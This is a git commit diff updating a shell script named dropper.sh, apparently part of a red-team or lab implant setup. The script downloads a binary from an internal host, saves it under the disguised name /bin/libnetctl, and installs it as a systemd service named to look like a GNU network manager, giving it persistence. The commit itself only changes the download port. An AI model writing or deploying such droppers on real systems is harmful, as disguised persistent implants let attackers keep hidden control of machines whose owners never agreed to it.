630e2ea378d5ddba6ed5ba3a36cfbc51d147af62
bcvillano <bvillano05@gmail.com>
2026-02-27 00:54:19 -0500

    Update dropper.sh

--- files/dropper.sh
+++ files/dropper.sh
@@ -1,6 +1,6 @@
-wget http://192.168.1.51/test-linux-agent -O /bin/libnetctl -o /dev/null
+wget http://192.168.1.51:8081/test-linux-agent -O /bin/libnetctl -o /dev/null
 chmod 755 /bin/libnetctl
-wget http://192.168.1.51/systemdfile -O /etc/systemd/system/gnu-network-manager.service -o /dev/null
+wget http://192.168.1.51:8081/systemdfile -O /etc/systemd/system/gnu-network-manager.service -o /dev/null
 chmod 644 /etc/systemd/system/gnu-network-manager.service
 
 systemctl daemon-reload
